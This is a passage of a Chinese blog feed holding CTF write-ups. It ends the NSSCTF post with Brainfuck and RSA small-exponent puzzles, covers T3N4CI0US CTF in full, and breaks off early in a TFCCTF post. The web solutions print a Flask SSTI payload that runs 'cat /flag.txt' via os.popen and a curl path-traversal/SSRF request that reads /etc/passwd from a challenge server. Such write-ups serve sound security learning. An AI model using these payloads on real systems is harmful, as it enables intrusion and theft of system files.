+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&gt;&gt;&gt;&gt;&gt;++++++++++&gt;++++++++++&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;-&gt;-&lt;&lt;&lt;&lt;&lt;&lt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;---&lt;&lt;&lt;&lt;&lt;&lt;&lt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&gt;++++++++++&lt;-]&gt;++++&lt;+[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;[.&gt;]
</code></pre>
<p>还有个核心价值观解密</p>
<pre><code class="hljs plaintext">CodeA=Decode(友善爱国平等友善自由友善敬业爱国诚信文明诚信自由平等友善平等友善公正诚信民主友善自由友善爱国公正敬业爱国爱国诚信自由友善爱国自由诚信民主爱国诚信民主友善平等友善爱国公正敬业公正爱国法治友善爱国公正敬业爱国爱国诚信自由诚信自由平等敬业文明爱国诚信文明诚信自由爱国诚信民主富强敬业富强)
CodeB=Decode(CodeB.png)
CodeC=Decode(CodeC.txt)
flag=MD5(CodeA+CodeB+CodeC)</code></pre>
<p>最终解的如下</p>
<pre><code class="hljs plaintext">富强明主文明和谐
pigissocutewhyyoukillpig
但是猪猪好好吃诶</code></pre>
<p>md5加密后得到flag</p>
<pre><code class="hljs plaintext">NSSCTF&#123;c05485d678cb8a6beb401f31d762532a&#125;</code></pre>
<h2 id="小明文">小明文</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">from gmpy2 import invert
from Crypto.Util.number import getPrime, bytes_to_long
from flag import getflag

e = 3
p = getPrime(1024)
q = getPrime(1024)
n = p * q
phiN = (p - 1) * (q - 1)
d = invert(e, phiN)
m = bytes_to_long(getflag().encode())
c = pow(m, e, n)
print(&quot;c=&quot; + str(c))
#c=128198926274489803523728445192921664
#flag=NSSCTF&#123;c&#125;
</code></pre>
<p>e=3，但是只给了e，c，小明文攻击</p>
<pre><code class="hljs plaintext">import math
from Crypto.Util.number import long_to_bytes
a=128198926274489803523728445192921664
print(long_to_bytes(math.ceil(a ** (1 / 3))))</code></pre>
<p>NSSCTF{ufind}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>T3N4CI0US CTF</title>
    <url>/2022/08/12/T3N4CI0US%20CTF/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121500298.png?x-oss-process=hzy" alt="image-20220812150043235"></p>
<span id="more"></span>
<hr>
<h1 id="pwn">PWN</h1>
<h2 id="check-check-check">Check Check Check</h2>
<blockquote>
<p>mic test one, two, three!!!</p>
<p>IP : 34.64.203.138 Port : 10009</p>
</blockquote>
<p>直接nc，find就出了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101452243.png?x-oss-process=hzy" alt="image-20220810145248139"></p>
<p>T3N4CI0US{ZG9yb3Jvbmc/ZG9uZz9kaW5nPw}</p>
<h1 id="web">WEB</h1>
<h2 id="world">world</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101508744.png?x-oss-process=hzy" alt="image-20220810150843662"></p>
<p>FLASK??莫非是ssti？但是找不到啥hint</p>
<p>试了试robots，是个提示吗？</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101511644.png?x-oss-process=hzy" alt="image-20220810151108596"></p>
<p>然后环境就炸了，最终这道题一直没写出来，不知道考察的是啥</p>
<p>后来和外国友人交流大致明白了，题目环境没了，放个脚本吧</p>
<pre><code class="hljs plaintext">import base64
from urllib.parse import quote


def rc4_main(key=&quot;init_key&quot;, message=&quot;init_message&quot;):
    # print(&quot;RC4 Encrypt the main function &quot;)
    s_box = rc4_init_sbox(key)
    crypt = str(rc4_excrypt(message, s_box))
    return crypt


def rc4_init_sbox(key):
    s_box = list(range(256))
    # print(&quot; The original  s  box ：%s&quot; % s_box)
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    # print(&quot; After the chaos  s  box ：%s&quot;% s_box)
    return s_box


def rc4_excrypt(plain, box):
    # print(&quot; Calling the encryptor succeeded .&quot;)
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(ord(s) ^ k))
    cipher = &quot;&quot;.join(res)
    print(&quot;%s&quot; % quote(cipher))
    return str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;)


rc4_main(&quot;HereIsTreasure&quot;,
         &quot;&#123;
   &#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&quot;)</code></pre>
<p>模仿的这道题目</p>
<p><a href="https://blog.csdn.net/aoao331198/article/details/124284420">CISCN2019 华东南赛区]Double Secret_aoao今晚吃什么的博客-CSDN博客</a></p>
<h2 id="rosin">Rosin</h2>
<blockquote>
<p>[!] The flag.txt is located in the flag folder.</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101529314.png?x-oss-process=hzy" alt="image-20220810152902239"></p>
<p>flag在flag.txt里，这个提示和没有没啥区别</p>
<pre><code class="hljs plaintext">curl -v --path-as-is http://34.125.194.164:49157?url=file:///.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101759354.png?x-oss-process=hzy" alt="image-20220810175953239"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101800836.png?x-oss-process=hzy" alt="image-20220810180008788"></p>
<p>再看一遍题目描述，这题出的真的很没质量，我以为多好的题呢，题目描述说的flag.txt在flag路径下，你题目里面又来个在root下，合着搞心态呢？？？？，最终还是伪协议直接读。。。。，我谢谢你</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102202112.png?x-oss-process=hzy" alt="image-20220810220248040"></p>
<p>T3N4CI0US{aa84_c1372_0a89de3c3_f0_1316340332a_2a055c065}</p>
<h2 id="cigarette">cigarette</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102115528.png?x-oss-process=hzy" alt="image-20220810211545462"></p>
<p>签到题，抓包得flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102116274.png?x-oss-process=hzy" alt="image-20220810211608209"></p>
<p>T3N4CI0US{bc298e7_daf7_b2d4b347f67_c_56e9d_de34152_9ad99b1_7eb78}</p>
<h2 id="viska">VISKA</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111649407.png?x-oss-process=hzy" alt="image-20220811164945307"></p>
<pre><code class="hljs plaintext">Vm0wd2QyUXlVWGxXYTFwT1ZsZFNXRll3Wkc5V01WbDNXa2M1VjAxV2JETlhhMXBQVm14S2MyTkljRmROYWxaeVZtcEtTMU5IVmtkWGJHUlRUVEZLVVZadGVGWmxSbGw0V2toR1VtSlZXbGhXYWtaTFUxWmFkR05GWkZwV01VcFlWVzAxVDFkSFNrZGpSVGxhWWxSR2RsWkdXbUZqYkhCSlkwZDRVMkV6UWxwV1ZFb3dZVEpHVjFOdVVsWmhlbXhoVm1wT1UyRkdVbGhsUjBacVlrWmFlVnBGV2xOVWJGcFpVV3h3VjFaNlJYZFdha1phWlZaT2NtRkhhRk5pVjJodlZtMXdUMVV5UmtkWGJGcFlZbFZhVkZSV2FFTlRiR3QzV2tSU1ZrMXJWalZhUkU1M1ZqRktSbGR0YUZwaGEzQkhXbFZhVDJSV1duTlRiV3hYVWpOb2IxWnRjRU5pTVVWNFdrVmthbEpXY0ZsWmJGWmhWbFpXY1ZKdFJsUlNiWFF6Vm14U1YxWXdNVVZTYTJoWFRWWktSRll3V2xwbGJGWjBZVVprYUdFeGNHaFhiRlpoWVRKT2MxcElUbWhTTW1oeldXeG9iMWRzV1hoWGJFNVRUVmQ0VjFSVmFHOWhSVEI1WVVac1dtRXhWWGhXTUZwaFpFZE9ObEp0ZUdsU2JrSktWa1phVjJFeVJrZFRXR2hZWVd0S2FGWnNXbUZqYkZweFVWaG9hbFpzY0hoV1IzaHJZVWRGZUdOR1VsaGlSbkJvVmtSS1RtVkdjRWxWYldoVFZrWmFVRlpHVmxka01XeFhWMjVPVm1Fd05YQlVWbFpYVGtaVmVXUkhkRnBXYXpWSVZUSTFSMVpXV2taalNGcGFUVlp3YUZwRlZYaFdWbEp5VGxkc1UySnJSak5XTVZKUFpERlplVkpyWkZoaWF6VnhWVEJrTkZkR2JITmhSVTVZVW14d2VGVldhRzlXUmtsM1YydGFWMUl6YUdoV2FrWkxWMVpHY21KR2FGaFRSVXBOVm10U1IxTXlVa2RVYmtwWVlYcHNXRmxZY0ZkV1ZscFlaVVprVjJGNlJsTlZSbEYzVUZFOVBRPT0=</code></pre>
<p>反复base64解码就会得到flag</p>
<p>T3N4CI0US{d79fa6_2bc60_db3_5_da5512c3d_8896b7_0_2796d6_0cd}</p>
<h1 id="re">RE</h1>
<h2 id="swood">Swood</h2>
<blockquote>
<p>string</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102305945.png?x-oss-process=hzy" alt="img"></p>
<p>T3N4CI0US{da39a3ee5e6b4b0d3255bfef95601890afd80709}</p>
<h2 id="warmup">Warmup</h2>
<p>一堆逻辑啥也不要问，签到题<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112142529.png?x-oss-process=hzy" alt="image-20220811214214425"></p>
<p>T3N4CI0US{773a_6d8c_c01fbc_f454646564_2_049eb4_3c2ad_852}</p>
<h2 id="whisen">WHISEN</h2>
<blockquote>
<p>You’d hate to combine.</p>
</blockquote>
<pre><code class="hljs plaintext">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  char s1[40]; // [rsp+0h] [rbp-50h] BYREF
  char *s2; // [rsp+28h] [rbp-28h]
  char v6[26]; // [rsp+36h] [rbp-1Ah] BYREF

  qmemcpy(v6, &quot;&#125;40_0hIfUrC&#123;S_4rrc0NT03k3T&quot;, sizeof(v6));  //密文
  s2 = (char *)malloc(0x1AuLL);
  printf(&quot;Enter the Password : &quot;);//加密逻辑，就是换顺序
  __isoc99_scanf(&quot;%s&quot;, s2);
  s1[0] = v6[25];
  s1[1] = v6[22];
  s1[2] = v6[19];
  s1[3] = v6[14];
  s1[4] = v6[10];
  s1[5] = v6[6];
  s1[6] = v6[4];
  s1[7] = v6[8];
  s1[8] = v6[12];
  s1[9] = v6[11];
  s1[10] = v6[16];
  s1[11] = v6[18];
  s1[12] = v6[21];
  s1[13] = v6[20];
  s1[14] = v6[3];
  s1[15] = v6[7];
  s1[16] = v6[2];
  s1[17] = v6[15];
  s1[18] = v6[13];
  s1[19] = v6[5];
  s1[20] = v6[14];
  s1[21] = v6[17];
  s1[22] = v6[23];
  s1[23] = v6[24];
  s1[24] = v6[9];
  if ( !strncmp(s1, s2, 0x1AuLL) )
    printf(&quot;Success! You found the flag!\n%s\n&quot;, s1);
  else
    puts(&quot;Incorrect Password !&quot;);
  return 0;
&#125;</code></pre>
<p>基本逻辑如上</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121134473.png?x-oss-process=hzy" alt="image-20220812113413999"></p>
<p>T3N4CI0US{r00T_f0r_h4ck3r}</p>
<h2 id="rooftop">Rooftop</h2>
<blockquote>
<p>string</p>
</blockquote>
<p>基本逻辑如下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208141653708.png?x-oss-process=hzy" alt="image-20220814165317052"></p>
<p>跟进emmdee5函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208141654444.png?x-oss-process=hzy" alt="image-20220814165407375"></p>
<p>字符反转之后md5解密</p>
<pre><code class="hljs plaintext">55347092ad1b19f9021174038078e57a
7ae5788003741102f9191bad92703455  // 两两翻转，整体倒置
i_don&#x27;t_find_it..</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208141713537.png?x-oss-process=hzy" alt="image-20220814171344434"></p>
<p><a href="https://md5hashing.net/hash/md5/7ae5788003741102f9191bad92703455">Hash md5: 7ae5788003741102f9191bad92703455 (md5hashing.net)</a></p>
<p>T3N4CI0US{i_don’t_find_it…}</p>
<h1 id="misc">MISC</h1>
<h2 id="find-me">find me</h2>
<blockquote>
<p>hello pls find Dolpari</p>
<p>flag format : T3N4CI0US{Site URL}</p>
</blockquote>
<p>在推特里面找到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101746428.png?x-oss-process=hzy" alt="image-20220810174628292"></p>
<p>实在找不到了，开个提示吧，俩提示直接扣我五十积分</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101748189.png?x-oss-process=hzy" alt="image-20220810174846140"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101749373.png?x-oss-process=hzy" alt="image-20220810174912333"></p>
<p>T3N4CI0US{<a href="https://www.instagram.com/dolpari_05">https://www.instagram.com/dolpari_05</a>}</p>
<h2 id="find-us">Find us</h2>
<blockquote>
<p>Hi, can you find us? Go into a site somewhere and look for us!</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208110003874.png?x-oss-process=hzy" alt="image-20220811000329813"></p>
<p>就是找官网呗</p>
<p>T3N4CI0US{<a href="https://t3n4ci0us.kr/member/">https://t3n4ci0us.kr/member/</a>}</p>
<h1 id="crypto">CRYPTO</h1>
<h2 id="french">french</h2>
<blockquote>
<p>French Ciper</p>
<p>V3Y4GK0FW{EccrEs<em>Xpvtj</em>Icdc}</p>
</blockquote>
<p>如此烂的题，，，二百多解居然一直解不出来，最终还是解出来了，查找了一下发现维吉尼亚是法国人，初步确定是维吉尼亚加密，但是需要密钥，怎么办？试了好久发现其加密方式，然后一个字符一个字符试出来的密钥，密钥是cle</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111202123.png?x-oss-process=hzy" alt="image-20220811120249174"></p>
<p>T3N4CI0US{CrypToVerryEasy}</p>
<p>交了不对，试了下_分隔开，对了</p>
<p>T3N4CI0US{CrypTo_Verry_Easy}</p>
<h2 id="ro">ro</h2>
<blockquote>
<p>[ W E = 360 ]   [ S N S = 360 ]   [ N E W S = ? ]</p>
</blockquote>
<p>一个IQ问题</p>
<p><a href="https://jyankquiz.com/iq%E5%95%8F%E9%A1%8C%E3%80%80we%EF%BC%9D360%E3%80%80sns%EF%BC%9D360%E3%80%80%E3%81%AA%E3%82%89%E3%81%B0%E3%80%80news%EF%BC%9D%EF%BC%9F/">智商问题 WE=360 SNS=360 如果是新闻*？ | jyankquiz</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208130938332.png?x-oss-process=hzy" alt="image-20220813093843255"></p>
<p>T3N4CI0US{540}</p>
<h2 id="before-porta-arrives-at-the-port复现">Before Porta arrives at the port!(复现)</h2>
<blockquote>
<p>Before Porta arrives at the port! Decryption is required to interpret this…</p>
<ul>
<li>…-- -. …- -.-. … ----- …- … # — .— .- -… .-… -… …–.- …- …–.- .–. -.-- .–. …–.- …- …–.- . …-. --. --… -…- --… -…- #</li>
</ul>
<p>key = cle</p>
</blockquote>
<p>刚开始是摩斯密码解密(/替换空格)然后porta解密</p>
<pre><code class="hljs plaintext">...--/-./....-/-.-./../-----/..-/.../#/---/.---/.-/-../.-../-../..--.-/..-/..--.-/.--./-.--/.--./..--.-/...-/..--.-/./..-./--./--../-..-/--../-..-/#

T3N4CI0USOJADLD_U_PYP_V_EFGZXZX
T3N4CI0US&#123;OJADLD_U_PYP_V_EFGZXZX&#125;</code></pre>
<p>这题最终没写出来，最后需要porta解码，这个当时试了，但是不行，也不知道咋回事</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208130934148.png?x-oss-process=hzy" alt="image-20220813093354793"></p>
<p>T3N4CI0US{CRYPTOIHADAPROBLEM}</p>
<p><a href="https://www.dcode.fr/porta-cipher">Porta Cipher - Online Decoder, Encoder (dcode.fr)</a></p>
<h1 id="osint">OSINT</h1>
<h2 id="g0">G0</h2>
<blockquote>
<p>What is the name of the electronic store around the place in the picture?</p>
<p>Please mark the space with _</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102300962.png?x-oss-process=hzy" alt="image-20220810230033828"></p>
<p>百度识图得到一个人的微博<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102301956.png?x-oss-process=hzy" alt="image-20220810230103893"></p>
<p>谷歌识图<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102301818.png?x-oss-process=hzy" alt="image-20220810230138654"></p>
<p>秋葉原の電子部品【パーツランド】，交了不对，这栋楼叫Tokyo Radio Department Store Shops</p>
<p>T3N4CI0US{Tokyo_Radio_Department_Store_Shops}</p>
<h2 id="japen-electronic">Japen Electronic</h2>
<blockquote>
<p>Find me the type of this thing</p>
<p>Flag Format: T3N4CI0US{Type_Name}</p>
<p>very easyyyyy</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208130935396.jpeg?x-oss-process=hzy" alt="img"></p>
<ul>
<li>
<p>Google <code>成田山深川</code></p>
</li>
<li>
<p>It is <a href="https://goo.gl/maps/1iZreEdu82qvkWVy7">Naritasan Fukagawa Fudōdō</a></p>
</li>
<li>
<p>It is in the Fukagawa neighbourhood of the Koto district</p>
<p>T3N4CI0US{Naritasan Fukagawa Fudōdō}</p>
</li>
</ul>
<h1 id="forensic">Forensic</h1>
<h2 id="docx">docx</h2>
<blockquote>
<p>I have a file of documents, and something is off.</p>
<p>Flag : T3N4CI0US{…}</p>
</blockquote>
<p>得到一个2.docx的附件，转压缩包，有一堆图片，看最大的那个</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111654437.png?x-oss-process=hzy" alt="image-20220811165418211"></p>
<p>搜FF D9，得到三个<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111655286.png?x-oss-process=hzy" alt="image-20220811165500197"></p>
<p>有个jpg没有文件头，删到这<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111657215.png?x-oss-process=hzy" alt="image-20220811165708154"></p>
<p>flag就出来了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111658822.png?x-oss-process=hzy" alt="image-20220811165819581"></p>
<p>T3N4CI0US{Is_1t_w0rt4_it_Escape?}</p>
<h2 id="yhparg复现">yhparg(复现)</h2>
<blockquote>
<p>I like Pokemon</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122348670.png?x-oss-process=hzy" alt="image-20220812234814598"></p>
<p>附件给的两张图，他的像素不一样，这两张图片不一样的地方就是flag</p>
<pre><code class="hljs plaintext">from PIL import Image

img2 = Image.open(&#x27;2.png&#x27;)
rgb_im2 = img2.convert(&#x27;RGBA&#x27;)

img1 = Image.open(&#x27;1.png&#x27;)
rgb_im1 = img1.convert(&#x27;RGBA&#x27;)

for i in range(250):
    for j in range(250):
        pix1 = rgb_im1.getpixel((i, j))
        pix2 = rgb_im2.getpixel((i, j))

        if pix1 != pix2:
            print(chr(pix2[0]), end=&quot;&quot;)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122346203.png?x-oss-process=hzy" alt="image-20220812234628117"></p>
<p>T3N4CI0US{H1D1N6_837W33N_1M463_15_C001_R1GHT?}</p>
<h1 id="总结">总结</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121458927.png?x-oss-process=hzy" alt="image-20220812145809785"></p>
<p>三天的比赛，打得不好，都是基础题，继续努力吧，团队赛，我却看不到我的团队，不知道说啥了，心累</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>TFCCTF</title>
    <url>/2022/07/31/TFCCTF/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312206056.png?x-oss-process=hzy" alt="image-20220731220657941"></p>
<span id="more"></span>
<hr>
<p>TFCCTF</p>
<h1 id="前言">前言</h1>
<p>这个比赛也是挺好，题目有难有易，考察点有的很新颖有的很常见，总之都是正常题目，这两天打强网杯真的是坐大牢，强网杯结束之后这个也快结束了，就浅看了一下，相比之下，还是国外的CTF适合我，giao</p>
<h1 id="misc">MISC</h1>
<h2 id="rules">RULES</h2>
<blockquote>
<p>Make sure you read the rules!</p>
</blockquote>
<p>TFCCTF{Fr33_fl4gz_f0r_U}</p>
<h2 id="discord-shenanigans-v2">DISCORD SHENANIGANS V2</h2>
<blockquote>
<p>We know that our Discord flags are the most specials ones. They raise our <strong>status</strong>! We plan to keep this tradition going, no matter what!</p>
<p>This one is hidden in plain s̷̤̎i̷̡͝g̴̤̿ḧ̴͚́ṫ̵̹.</p>
<p>Note: |̸̥͔͚͕̟̔̓̚|̴̨̫̿̎|̷͈̓̌̈|̷̼̱̦̲͐́́|̷̧͍̥͚̈̅͜͝|̷̱̱̭̏̓̈́̍̚|̴̨͚̫͇̽̌̽̕͝|̸͚̏|̴̨̬͉͔̩̈́̉͆̂͋|̸̟͇̈̾͝|̸̱͇̔̓ might be able to help you… if you ask nicely. He’s a bit shy, though.</p>
<p>Hint: Read the message he gives you when you ask nicely very carefully!</p>
</blockquote>
<p>这个dicord直接找flag一直都是常规，这次的有意思</p>
<p>刚开始直接在频道通信会回复<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312117694.png?x-oss-process=hzy" alt="image-20220731211722648"></p>
<p>私聊他就显示说我问的不好</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312117904.png?x-oss-process=hzy" alt="image-20220731211755843"></p>
<p>所以加了一个please</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312119219.png?x-oss-process=hzy" alt="image-20220731211948159"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312120552.png?x-oss-process=hzy" alt="image-20220731212002507"></p>
<p>也许它与exif有关，exif是保存在图像文件中的元数据。</p>
<p>挑战描述说答案是在<em>公告Discord</em>频道中，所以下载了其中的一张图片，使用工具读取exif数据</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011153243.png?x-oss-process=hzy" alt="current-50"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011153429.png?x-oss-process=hzy" alt="image-20220801115323383"></p>
<p>TFCCTF{h1dd3n_1n_pl4in_br3ad!..1_m3an_s1gh7}</p>
<h1 id="web">WEB</h1>
<h2 id="robots-and-music">ROBOTS AND MUSIC</h2>
<blockquote>
<p>Do you like old music?</p>
</blockquote>
